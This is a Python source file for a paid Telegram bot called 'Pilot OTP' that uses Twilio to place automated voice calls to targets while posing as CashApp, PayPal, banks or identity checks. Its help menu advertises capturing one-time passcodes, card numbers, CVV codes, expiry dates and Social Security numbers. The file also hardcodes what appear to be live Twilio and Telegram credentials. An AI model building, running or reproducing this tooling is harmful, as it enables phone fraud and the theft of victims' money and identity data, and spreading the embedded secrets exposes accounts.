import os
import telebot
from twilio.rest import Client
from telebot import types
import requests
while True:
  try:
    account_sid = 'AC4c3c793eac842346cef4820e46501295'
    callid = None
    auth_token = '27ac8193bae177474d54c0fc4421578c'
    from_number = '+15076691829'
    status_callback_url = 'https://d9ac-100-0-165-141.ngrok.io/call/status'
    telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
    telegram_bot = telebot.TeleBot(telegram_bot_token)
    @telegram_bot.message_handler(commands=['cashapp'])
    def cashapp_command(message):
        try:
            print(message.from_user.id)
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /cashapp John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
        )
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        print(call.sid)
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['paypal'])
    def paypal_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /paypal John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['bank'])
    def bank_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 3:
            telegram_bot.reply_to(message, 'Please specify the name, phone number, and bank name to call, e.g. /bank John +1234567890 Chase')
            return
        name, to_number, bank_name = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    #CVV
    @telegram_bot.message_handler(commands=['ssn'])
    def ssn_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 3:
            telegram_bot.reply_to(message, 'Please specify the name, phone number, and bank name to call, e.g. /ssn John +1234567890 Chase')
            return
        name, to_number, bank_name = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['help'])
    def help_command(message):
        button_text = "Buy"
        button_data = 'buying'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        button_text2 = "Server"
        button_data2 = 'server'
        button2 = types.InlineKeyboardButton(text=button_text2, callback_data=button_data2)
        keyboard = types.InlineKeyboardMarkup().add(button).add(button2)
        message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🎧~/setvoice | set language\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
  
  #Call back function
    @telegram_bot.callback_query_handler(func=lambda call: True)
    def handle_callback_query(call):
            call_data = call.data.split()
            if call_data[0] == 'hangup':
                client = Client(account_sid, auth_token)
                call_sid = call_data[1]
                client.calls(call_sid).update(status='completed')
    telegram_bot.polling()
  except Exception as e: print(e)
  